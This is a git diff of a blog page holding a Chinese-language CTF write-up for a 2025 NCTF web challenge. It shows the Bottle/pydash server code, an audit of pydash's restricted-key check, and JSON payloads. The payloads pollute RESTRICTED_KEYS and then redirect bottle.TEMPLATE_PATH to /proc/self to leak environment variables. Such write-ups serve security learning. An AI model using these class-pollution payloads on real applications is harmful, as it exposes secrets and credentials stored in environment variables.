+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Optional</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pydash</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bottle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 禁止访问的路径属性列表，主要是Python对象的特殊方法和属性</span>
+</span></span><span class="line"><span class="cl"><span class="n">__forbidden_path__</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;__annotations__&#39;</span><span class="p">,</span> <span class="s1">&#39;__call__&#39;</span><span class="p">,</span> <span class="s1">&#39;__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;__closure__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s1">&#39;__code__&#39;</span><span class="p">,</span> <span class="s1">&#39;__defaults__&#39;</span><span class="p">,</span> <span class="s1">&#39;__delattr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__dict__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s1">&#39;__dir__&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">,</span> <span class="s1">&#39;__eq__&#39;</span><span class="p">,</span> <span class="s1">&#39;__format__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s1">&#39;__ge__&#39;</span><span class="p">,</span> <span class="s1">&#39;__get__&#39;</span><span class="p">,</span> <span class="s1">&#39;__getattribute__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s1">&#39;__gt__&#39;</span><span class="p">,</span> <span class="s1">&#39;__hash__&#39;</span><span class="p">,</span> <span class="s1">&#39;__init__&#39;</span><span class="p">,</span> <span class="s1">&#39;__init_subclass__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s1">&#39;__kwdefaults__&#39;</span><span class="p">,</span> <span class="s1">&#39;__le__&#39;</span><span class="p">,</span> <span class="s1">&#39;__lt__&#39;</span><span class="p">,</span> <span class="s1">&#39;__module__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s1">&#39;__name__&#39;</span><span class="p">,</span> <span class="s1">&#39;__ne__&#39;</span><span class="p">,</span> <span class="s1">&#39;__new__&#39;</span><span class="p">,</span> <span class="s1">&#39;__qualname__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s1">&#39;__reduce__&#39;</span><span class="p">,</span> <span class="s1">&#39;__reduce_ex__&#39;</span><span class="p">,</span> <span class="s1">&#39;__repr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__setattr__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s1">&#39;__sizeof__&#39;</span><span class="p">,</span> <span class="s1">&#39;__str__&#39;</span><span class="p">,</span> <span class="s1">&#39;__subclasshook__&#39;</span><span class="p">,</span> <span class="s1">&#39;__wrapped__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="s2">&#34;Optional&#34;</span><span class="p">,</span> <span class="s2">&#34;render&#34;</span>
+</span></span><span class="line"><span class="cl">                      <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 禁止访问的名称列表，包括bottle模块和内置对象</span>
+</span></span><span class="line"><span class="cl"><span class="n">__forbidden_name__</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;bottle&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">__forbidden_name__</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">dir</span><span class="p">(</span><span class="nb">globals</span><span class="p">()[</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置变量值的函数</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">setval</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">bool</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果名称包含双下划线，返回False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">name</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;__&#34;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查名称是否在禁止列表中</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">__forbidden_name__</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="n">word</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查路径是否包含禁止的属性</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">__forbidden_path__</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">path</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">word</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取全局对象</span>
+</span></span><span class="line"><span class="cl">    <span class="n">obj</span> <span class="o">=</span> <span class="nb">globals</span><span class="p">()[</span><span class="n">name</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 使用pydash.set_方法设置对象的属性值</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 如果设置失败，返回False</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 设置成功，返回True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 处理POST请求的路由，用于设置变量值</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@bottle.post</span><span class="p">(</span><span class="s1">&#39;/setValue&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_value</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取请求中的name参数</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取请求中的path参数，必须是字符串类型</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;no&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查name和path的长度是否超出限制</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;no&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取请求中的value参数</span>
+</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;value&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 调用setval函数设置变量值，并根据结果返回yes或no</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;yes&#34;</span> <span class="k">if</span> <span class="n">setval</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">else</span> <span class="s2">&#34;no&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 处理GET请求的路由，用于渲染模板</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@bottle.get</span><span class="p">(</span><span class="s1">&#39;/render&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">render_template</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取请求中的path参数</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查path长度是否超出限制</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;hacker&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 定义黑名单字符，防止路径注入</span>
+</span></span><span class="line"><span class="cl">    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s2">&#34;}&#34;</span><span class="p">,</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;%&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查path是否包含黑名单字符</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;hacker&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 使用bottle.template渲染模板</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bottle</span><span class="o">.</span><span class="n">template</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 启动bottle应用，监听所有接口的8000端口</span>
+</span></span><span class="line"><span class="cl"><span class="n">bottle</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此题先看懂setval函数，这里面<code> pydash.set_(obj, path, value)</code>很重要，其中name是我们要污染的对象，path是被污染的功能点路径，value是我们想让这个对象成为的值。</p>
+<p>再来看此题，由pydash知https://github.com/dgilland/pydash/blob/develop/src/pydash/helpers.py，path有一个bottle.TEMPLATE_PATH&mdash;(指定模板文件所在的路径)，我们要污染他的路径，让他指向/proc/self/,然后再最后在 /render 路由下 GET 传参 path 为 environ ，对其进⾏渲染，就可以获取环境变量了，但是pydash限制不能随意更改bottle属性，接下来审计一下pydash源码，关键限制代码如下（截取了三段代码）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">base_set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">allow_override</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Set an object&#39;s `key` to `value`. If `obj` is a ``list`` and the `key` is the next available
+</span></span></span><span class="line"><span class="cl"><span class="s2">    index position, append to list; otherwise, pad the list of ``None`` and then append to the list.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Args:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        obj: Object to assign value to.
+</span></span></span><span class="line"><span class="cl"><span class="s2">        key: Key or index to assign to.
+</span></span></span><span class="line"><span class="cl"><span class="s2">        value: Value to assign.
+</span></span></span><span class="line"><span class="cl"><span class="s2">        allow_override: Whether to allow overriding a previously set key.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果obj是字典类型</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 如果允许覆盖或者key不在字典中</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">allow_override</span> <span class="ow">or</span> <span class="n">key</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 将key对应的值设置为value</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果obj是列表类型</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="nb">list</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 将key转换为整数类型</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 如果key小于列表的长度</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 如果允许覆盖</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">allow_override</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 将列表中key位置的值设置为value</span>
+</span></span><span class="line"><span class="cl">                <span class="n">obj</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 如果key大于列表的长度</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">key</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 使用None填充列表，直到key的位置</span>
+</span></span><span class="line"><span class="cl">                <span class="n">obj</span><span class="p">[:]</span> <span class="o">=</span> <span class="p">(</span><span class="n">obj</span> <span class="o">+</span> <span class="p">[</span><span class="kc">None</span><span class="p">]</span> <span class="o">*</span> <span class="n">key</span><span class="p">)[:</span><span class="n">key</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 在列表末尾追加value</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果obj是其他类型，并且允许覆盖或者该属性不存在，并且obj不是None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="p">(</span><span class="n">allow_override</span> <span class="ow">or</span> <span class="ow">not</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span> <span class="ow">and</span> <span class="n">obj</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 调用_raise_if_restricted_key函数检查是否是受限制的键</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_raise_if_restricted_key</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 使用setattr函数设置obj的key属性为value</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">setattr</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">RESTRICTED_KEYS</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;__globals__&#34;</span><span class="p">,</span> <span class="s2">&#34;__builtins__&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_raise_if_restricted_key</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Prevent access to restricted keys for security reasons.</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">RESTRICTED_KEYS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">KeyError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;access to restricted key </span><span class="si">{</span><span class="n">key</span><span class="si">!r}</span><span class="s2"> is not allowed&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以接下来思路明显了，先污染key函数为空，使我们可以用globals，然后再污染PATH，再渲染envrion即可</p>
+<p>用bp在/setValue抓包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">name</span><span class="o">=</span><span class="n">pydash</span><span class="c1">#污染对象是pydash</span>
+</span></span><span class="line"><span class="cl"><span class="n">path</span><span class="p">:</span><span class="s2">&#34;helpers.RESTRICTED_KEYS&#34;</span> <span class="c1"># 路径就是 helpers ⽂件中的 RESTRICTED_KEYS</span>
+</span></span><span class="line"><span class="cl"><span class="n">value</span><span class="p">:[]</span><span class="c1">#修改成为的值就是空列表</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">name</span><span class="o">=</span><span class="n">setval</span> <span class="c1"># 污染对象是 setval</span>
+</span></span><span class="line"><span class="cl"><span class="n">path</span><span class="p">:</span><span class="s2">&#34;__globals__.bottle.TEMPLATE_PATH&#34;</span> <span class="c1"># 路径是模板⽂件路径</span>
+</span></span><span class="line"><span class="cl"><span class="n">value</span><span class="p">:[</span><span class="o">../../../../</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="p">]</span> <span class="c1"># 修改为的值是存储环境变量⽂件路径，因为题⽬提示flag在环境变量中name=setval</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>深度解析：此paylaod寻找setval函数，将该函数往上查询____globals____.（<code>__globals__</code> 是函数对象的一个属性，它会返回一个包含该函数全局命名空间的字典）,然后调用bottle框架中的TEMPLATE_PATH(指定模板文件所在的路径)，将路径设置为/proc/self/这样访问path时会自动跳转到这个路径下</p>
+<p>流程：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="s2">&#34;path&#34;</span><span class="p">:</span><span class="s2">&#34;helpers.RESTRICTED_KEYS&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="s2">&#34;value&#34;</span><span class="p">:[</span>
+</span></span><span class="line"><span class="cl">	<span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意type改成json</p>
+<p><img src="/p/2025-nctf-web/image-20250328003344129.png"
+	width="969"
+	height="428"
+	srcset="/p/2025-nctf-web/image-20250328003344129_hu_410f3323dec1691b.png 480w, /p/2025-nctf-web/image-20250328003344129_hu_493efa33bf521663.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="543px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="s2">&#34;path&#34;</span><span class="p">:</span><span class="s2">&#34;__globals__.bottle.TEMPLATE_PATH&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="s2">&#34;value&#34;</span><span class="p">:[</span><span class="s2">&#34;/proc/self&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-nctf-web/image-20250328003646832.png"
+	width="833"
+	height="433"
+	srcset="/p/2025-nctf-web/image-20250328003646832_hu_6bac5fbfda8abc94.png 480w, /p/2025-nctf-web/image-20250328003646832_hu_4641811e523e3919.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="461px"
+	
+></p>
+<p><img src="/p/2025-nctf-web/image-20250328003956670.png"
+	width="1250"
+	height="405"
+	srcset="/p/2025-nctf-web/image-20250328003956670_hu_f33a7e88580ae309.png 480w, /p/2025-nctf-web/image-20250328003956670_hu_6ccec5e6bb859ad7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="308"
+		data-flex-basis="740px"
+	
+></p>
+
 </section>
 
 
@@ -618,6 +1202,19 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-长城杯-ccforum</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-nss%23round29-misc/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-nss#round29-misc</h2>
         </div>
     </a>
 </article>
